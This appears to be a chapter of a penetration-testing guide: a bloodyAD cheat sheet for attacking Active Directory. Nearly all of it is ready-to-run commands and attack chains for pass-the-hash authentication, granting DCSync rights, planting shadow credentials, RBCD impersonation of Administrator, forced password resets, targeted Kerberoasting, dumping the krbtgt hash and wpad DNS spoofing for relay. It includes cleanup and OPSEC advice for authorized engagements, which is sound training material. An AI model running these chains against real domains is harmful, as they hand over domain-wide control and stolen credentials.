---
title: "14 · bloodyAD Quick Reference"
---

# 14 · bloodyAD Quick Reference

> Cheat sheet for the most useful bloodyAD operations.

!!! note "Phase overview"
    `bloodyAD` is the Linux/Kerberos answer to PowerView. Commit these patterns to muscle memory because you'll use them constantly across phases 4, 5, 6, 8, 10.

!!! tip "Why bloodyAD over alternatives"
    Pure-Python, no .NET on the target, fully proxy-aware (`proxychains4` friendly), supports password / NT hash / AES key / Kerberos ccache / PFX certificate auth out of the box, and crucially supports LDAP, LDAPS, and **LDAP signing/channel binding** (`--gc`, `+` scheme prefixes). When `ldapdomaindump` and `impacket-ldapsearch` choke on signing-required DCs, bloodyAD usually still works.

### 14.0 · Authentication cheatsheet

`bloodyAD` accepts the same auth patterns everywhere. Pick one and prepend the action.

```bash title="Auth flag patterns"
# Password
bloodyAD --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u user -p 'Password123!' <action>

# NT hash (Pass-the-Hash)
bloodyAD --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u user -p :<NTHASH> <action>

# Full LM:NT
bloodyAD --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u user -p <LMHASH>:<NTHASH> <action>

# Kerberos ticket (must export KRB5CCNAME)
KRB5CCNAME=user.ccache bloodyAD \
  --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u 'user@domain.local' -k <action>

# Certificate (PKINIT, e.g. from ESC1/ESC8)
bloodyAD --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u user -c ':cert.pfx' <action>
# or with a PFX password
bloodyAD --host dc.domain.local --dc-ip <IP> \
  -d domain.local -u user -c 'pfxpassword:cert.pfx' <action>

# Force LDAPS (signing/channel binding required scenarios)
bloodyAD --host dc.domain.local --dc-ip <IP> --scheme ldaps \
  -d domain.local -u user -p 'Password123!' <action>

# Force LDAP over GC (port 3268) for forest-wide queries
bloodyAD --host dc.domain.local --dc-ip <IP> --gc \
  -d domain.local -u user -p 'Password123!' <action>
```

!!! tip "Set these variables once per engagement"
    Every command in this doc references these. Set them once in your shell and the rest just works.
    ```bash
    export DC_HOST='dc.domain.local'
    export DC_IP='10.10.10.10'
    export DOMAIN='domain.local'
    export USER='user@domain.local'
    export CCACHE="$HOME/loot/user.ccache"
    ```

!!! warning "Clock skew + proxy boilerplate"
    Through SOCKS or with a stale ccache, Kerberos hates clock drift. Wrap every Kerberos call:
    ```bash
    KRB5CCNAME=$CCACHE faketime '-7 seconds' \
      proxychains4 -q bloodyAD \
      --host $DC_HOST --dc-ip $DC_IP \
      -d $DOMAIN -u $USER -k <action>
    ```

### 14.1 · Common bloodyAD operations

```bash title="Search + set + Kerberos invocation"
# Some examples:

# Find gMSA
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName

# Set attribute
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set object 'CN=obj,DC=...' attributeName -v value

# With Kerberos + clock skew + proxy
KRB5CCNAME=$CCACHE faketime '-7 seconds' \
  proxychains4 -q bloodyAD \
  --host $DC_HOST --dc-ip $DC_IP \
  -d $DOMAIN -u $USER -k \
  <command>
```

### 14.2 · `get` actions (recon)

```bash title="Object inspection"
# Read all attributes of an object
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get object 'CN=Administrator,CN=Users,DC=domain,DC=local'

# Read specific attributes
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get object 'targetuser' --attr memberOf,servicePrincipalName,userAccountControl

# Show only attributes you have permission to write (ACL recon!)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get writable

# Show writable attributes for a specific principal (impersonate ACL view)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get writable --otype USER --right WRITE

# Children of a container/OU
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get children 'OU=Servers,DC=domain,DC=local'
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get children --otype COMPUTER

# Group members (recursive)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get membership 'targetuser'           # groups user belongs to
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get membership 'targetuser' --no-recursive
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get object 'Domain Admins' --attr member

# Trusts (forest enumeration)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get trusts

# Password policy (default + fine-grained PSO)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search --filter '(objectClass=domainDNS)' \
  --attr minPwdLength,lockoutThreshold,pwdProperties
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search --filter '(objectClass=msDS-PasswordSettings)'

# DNS records (great when standard DNS is locked down)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get dnsDump
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get dnsDump --zone domain.local --no-detail
```

```bash title="LDAP filter recipes (pair with `get search`)"
# Kerberoastable users (have SPN, are users)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user))' \
  --attr sAMAccountName,servicePrincipalName

# AS-REP roastable (DONT_REQ_PREAUTH, UAC bit 4194304)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(objectCategory=person))' \
  --attr sAMAccountName

# Unconstrained delegation (TRUSTED_FOR_DELEGATION, UAC bit 524288)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
  --attr sAMAccountName,dNSHostName

# Constrained delegation (any msDS-AllowedToDelegateTo set)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(msDS-AllowedToDelegateTo=*)' \
  --attr sAMAccountName,msDS-AllowedToDelegateTo

# Resource-Based Constrained Delegation targets (writable RBCD attribute)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
  --attr sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity

# gMSA (you saw it; here for completeness)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName,msDS-GroupMSAMembership

# LAPS-readable computers (legacy ms-Mcs-AdmPwd)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(ms-Mcs-AdmPwd=*)' \
  --attr sAMAccountName,ms-Mcs-AdmPwd

# Windows LAPS (newer attribute)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(msLAPS-Password=*)' \
  --attr sAMAccountName,msLAPS-Password

# Disabled accounts (ACCOUNTDISABLE bit 2)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(userAccountControl:1.2.840.113556.1.4.803:=2)'

# Password never expires (DONT_EXPIRE_PASSWD bit 65536)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(userAccountControl:1.2.840.113556.1.4.803:=65536)'

# Computers running Server OS
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search \
  --filter '(&(objectCategory=computer)(operatingSystem=*Server*))' \
  --attr dNSHostName,operatingSystem

# Find principals with admin-like descriptions (low effort, sometimes hits)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search --filter '(description=*pass*)' --attr sAMAccountName,description
```

!!! tip "UAC bit reference (for the `:1.2.840.113556.1.4.803:` matching rule)"
    | Bit | Decimal | Meaning |
    |---|---|---|
    | 0x0002 | 2 | ACCOUNTDISABLE |
    | 0x0010 | 16 | LOCKOUT |
    | 0x0020 | 32 | PASSWD_NOTREQD |
    | 0x0040 | 64 | PASSWD_CANT_CHANGE |
    | 0x0080 | 128 | ENCRYPTED_TEXT_PWD_ALLOWED |
    | 0x10000 | 65536 | DONT_EXPIRE_PASSWORD |
    | 0x80000 | 524288 | TRUSTED_FOR_DELEGATION (unconstrained) |
    | 0x100000 | 1048576 | NOT_DELEGATED |
    | 0x200000 | 2097152 | USE_DES_KEY_ONLY |
    | 0x400000 | 4194304 | DONT_REQ_PREAUTH (AS-REP roast) |
    | 0x1000000 | 16777216 | TRUSTED_TO_AUTH_FOR_DELEGATION (constrained w/ protocol transition) |

### 14.3 · `add` actions (the offensive bread and butter)

```bash title="Computer accounts, group membership, ACLs, delegation, certs"
# Add a computer (abuses ms-DS-MachineAccountQuota, default 10 per user)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add computer evilpc 'EvilPass123!'
# Then use evilpc$ for RBCD, Kerberoast targets, etc.

# Add yourself to a group (need GenericAll / WriteProperty member)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add groupMember 'Domain Admins' 'targetuser'
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add groupMember 'Backup Operators' 'targetuser'

# Grant DCSync rights to a principal (need WriteDACL on the domain object)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add dcsync targetuser
# Verify with a DCSync attempt (impacket-secretsdump)

# Grant GenericAll on an object (full takeover of that object)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add genericAll 'CN=victim,CN=Users,DC=domain,DC=local' 'attacker'

# Set arbitrary ACE on an object's DACL
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add objectAcl 'CN=victim,...' 'attacker' --right WriteDACL
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add objectAcl 'CN=victim,...' 'attacker' --right ResetPassword

# Resource-Based Constrained Delegation (requires control of the *target* computer)
# Lets attacker.evilpc$ impersonate any user to target.victim$
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add rbcd 'victim$' 'evilpc$'
# Then S4U2Self/S4U2Proxy with impacket-getST:
#   getST.py -spn cifs/victim.domain.local -impersonate administrator \
#            -dc-ip <IP> domain.local/evilpc\$:'EvilPass123!'

# Shadow Credentials (msDS-KeyCredentialLink) for PKINIT auth as the target
# Requires GenericWrite/GenericAll on target. Whisker/pyWhisker style.
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add shadowCredentials 'targetuser'
# bloodyAD prints the cert path + base64 PFX. Use it with gettgtpkinit.py / certipy:
#   certipy auth -pfx <file>.pfx -dc-ip <IP> -domain domain.local

# Set a UAC flag (e.g., disable Kerberos pre-auth → AS-REP roast)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add uac 'targetuser' -f DONT_REQ_PREAUTH
# Then impacket-GetNPUsers ...

# Set TRUSTED_FOR_DELEGATION (requires SeEnableDelegationPrivilege, rare)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add uac 'evilpc$' -f TRUSTED_FOR_DELEGATION

# Add a user (requires Create Child on Users container)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add user evilbob 'EvilBob123!'

# Add a DNS record (great for ADIDNS spoofing / NTLM relay setups)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add dnsRecord wpad 192.168.1.66
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  add dnsRecord attacker 192.168.1.66 --type A --zone domain.local
# Default Authenticated Users can create new (non-existing) DNS records!
```

!!! tip "Common attack chains, pick the rightmost primitive you have"
    | You have on target | Easiest follow-up | Tooling |
    |---|---|---|
    | `GenericAll` user | `set password` (force reset) OR `add shadowCredentials` (stealthier, no password change) | `bloodyAD set password` / `add shadowCredentials` |
    | `GenericAll` group | `add groupMember` yourself | `bloodyAD add groupMember` |
    | `GenericAll` computer | `add rbcd` then S4U | `bloodyAD add rbcd` + `getST.py` |
    | `WriteProperty` (specific) | Depends on attribute (SPN → Kerberoast; member → group join) | `bloodyAD set object` |
    | `WriteDACL` | `add dcsync` if on domain object, else `add genericAll` for self | `bloodyAD add dcsync` / `add genericAll` |
    | `WriteOwner` | `set owner` to self, then `add genericAll` | `bloodyAD set owner` |
    | `ForceChangePassword` | `set password` without knowing old | `bloodyAD set password` |
    | `AddSelf` on group | `add groupMember` (with self) | `bloodyAD add groupMember` |
    | `ReadGMSAPassword` | Read `msDS-ManagedPassword`, derive NT hash | `bloodyAD get object ... --attr msDS-ManagedPassword` then `gMSADumper` |
    | `ReadLAPSPassword` | Read `msLAPS-Password` / `ms-Mcs-AdmPwd` | `bloodyAD get search` |


### 14.4 · `set` actions (modify objects)

```bash title="Reset passwords, take ownership, modify attributes"
# Force-reset a password (need ResetPassword or GenericAll/Write)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set password 'targetuser' 'NewPass123!'

# Change own password (knowing the old one, no special rights)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set password 'self' 'NewPass123!' --oldpass 'OldPass'

# Take ownership (need WriteOwner)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set owner 'CN=victim,...' 'attacker'
# Now you have implicit WriteDACL → grant yourself GenericAll → done.

# Set / replace any attribute
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set object 'CN=victim,...' description -v 'pwned'

# Add SPN to a user (targeted Kerberoast against an account whose pwd you can't reset)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set object 'targetuser' servicePrincipalName -v 'fake/service.domain.local'
# Then impacket-GetUserSPNs -request ... and crack offline.
# Restore: set servicePrincipalName back to its original value (or empty).

# Clear an attribute (no -v argument)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set object 'targetuser' servicePrincipalName

# Modify msDS-AllowedToDelegateTo (constrained delegation list)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  set object 'evilpc$' msDS-AllowedToDelegateTo \
  -v 'cifs/dc.domain.local' -v 'host/dc.domain.local'
```

!!! warning "Targeted Kerberoasting (no password reset needed)"
    If you have `WriteProperty` on a user's `servicePrincipalName`, you can briefly add an SPN, request a TGS, then remove the SPN. The user never notices, and you walk away with an offline-crackable hash.
    ```bash
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      set object 'victim' servicePrincipalName -v 'fake/svc'
    impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN/attacker:pass
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      set object 'victim' servicePrincipalName    # clear it back
    ```

### 14.5 · `remove` actions (cleanup + counter-moves)

```bash title="Undo your modifications"
# Remove a group member
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove groupMember 'Domain Admins' 'targetuser'

# Remove DCSync ACE (cleanup, or kill someone else's persistence)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove dcsync targetuser

# Remove RBCD entry
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove rbcd 'victim$' 'evilpc$'

# Remove shadow credentials you planted
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove shadowCredentials 'targetuser'
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove shadowCredentials 'targetuser' --key <DEVICE_ID>

# Remove a UAC flag
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove uac 'targetuser' -f DONT_REQ_PREAUTH

# Remove a custom DNS record
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove dnsRecord wpad 192.168.1.66

# Remove an ACL entry
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove objectAcl 'CN=victim,...' 'attacker' --right WriteDACL

# Remove a computer account you created
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  remove object 'CN=evilpc,CN=Computers,DC=domain,DC=local'
```

!!! danger "OPSEC reminder"
    Every `add`/`set`/`remove` writes to AD and replicates. Defenders watching directory changes (e.g. with `Repadmin`, MDI, or LDAP audit logs) will see them. Always plan the cleanup before the modification, and confirm you've reverted before disengaging.

### 14.6 · Worked end-to-end mini-chains

!!! example "Chain 1: GenericAll on user → shadow creds → PKINIT → SYSTEM"
    ```bash
    # 1. Confirm primitive
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      get writable --otype USER --right WRITE

    # 2. Plant key credential (no password change, target keeps using their account)
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      add shadowCredentials 'targetuser'
    # → bloodyAD writes targetuser.pfx and prints the device ID

    # 3. PKINIT auth + UnPAC-the-hash to get NT hash
    certipy-ad auth -pfx targetuser.pfx -dc-ip $DC_IP -domain $DOMAIN

    # 4. Use the hash for whatever's next (PSExec, DCSync, etc.)
    impacket-secretsdump -hashes :<NT> $DOMAIN/targetuser@$DC_HOST

    # 5. Cleanup
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      remove shadowCredentials 'targetuser'
    ```

!!! example "Chain 2: WriteDACL on domain → DCSync"
    ```bash
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      add dcsync attacker
    impacket-secretsdump -just-dc-user krbtgt $DOMAIN/attacker:pass@$DC_HOST
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      remove dcsync attacker
    ```

!!! example "Chain 3: GenericWrite on computer → RBCD → Domain Admin"
    ```bash
    # 1. Create a computer we control (default quota = 10)
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      add computer evilpc 'EvilPass123!'

    # 2. Set RBCD: evilpc$ allowed to act on behalf of anyone to victim$
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      add rbcd 'victim$' 'evilpc$'

    # 3. S4U2Self + S4U2Proxy as Administrator
    impacket-getST -spn cifs/victim.domain.local \
      -impersonate administrator \
      -dc-ip $DC_IP $DOMAIN/evilpc\$:'EvilPass123!'

    # 4. Use the ticket
    export KRB5CCNAME=administrator@cifs_victim.domain.local@DOMAIN.LOCAL.ccache
    impacket-psexec -k -no-pass victim.domain.local

    # 5. Cleanup
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      remove rbcd 'victim$' 'evilpc$'
    ```

!!! example "Chain 4: ADIDNS spoof for relay"
    ```bash
    # Authenticated Users can create new DNS records by default
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      add dnsRecord wpad <YOUR_IP>
    # Now point a relay at incoming WPAD/HTTP, etc.
    # Cleanup
    bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
      remove dnsRecord wpad <YOUR_IP>
    ```

### 14.7 · Useful one-liners and tips

```bash title="Quality of life"
# Pretty-print only the attributes you care about
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get object 'targetuser' --attr sAMAccountName,memberOf,userAccountControl,servicePrincipalName

# Pipe into grep / jq when --raw or LDIF-ish output is needed
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search --filter '(servicePrincipalName=*)' --attr sAMAccountName,servicePrincipalName \
  | tee kerberoastable.txt

# Count results (sanity check before mass actions)
bloodyAD --host $DC_HOST --dc-ip $DC_IP -d $DOMAIN -u $USER -k \
  get search --filter '(objectCategory=computer)' --attr sAMAccountName | wc -l

# When LDAPS is required (signing/channel binding) but you only have password
bloodyAD --host $DC_HOST --dc-ip $DC_IP --scheme ldaps -d $DOMAIN -u u -p p <action>

# Through a SOCKS pivot
proxychains4 -q bloodyAD --host $DC_HOST --dc-ip $DC_IP \
  -d $DOMAIN -u $USER -k <action>

# Combined: Kerberos + clock skew + SOCKS + LDAPS
KRB5CCNAME=$CCACHE faketime '-7 seconds' \
  proxychains4 -q bloodyAD \
  --host $DC_HOST --dc-ip $DC_IP --scheme ldaps \
  -d $DOMAIN -u $USER -k <action>
```

!!! tip "Pair with these tools"
    - `BloodHound` / `bloodhound-python` to find the primitives, then `bloodyAD` to weaponize them
    - `certipy-ad` for AD CS attacks (ESC1 through ESC15) once you have a writable cert template
    - `impacket-getST`, `impacket-secretsdump`, `impacket-psexec` as the post-bloodyAD action layer
    - `gMSADumper.py` after reading `msDS-ManagedPassword` to derive the gMSA's NT hash
    - `targetedKerberoast.py` if you'd rather automate the SPN-add/roast/remove dance

!!! danger "Don't forget"
    1. Snapshot whatever you change (`get object` before, `get object` after)
    2. Revert in the **opposite order** you added things
    3. Verify reverts with another `get object` / `get writable`
    4. Keep a kill list in your engagement notes: object DN, attribute, original value, new value, time set, time reverted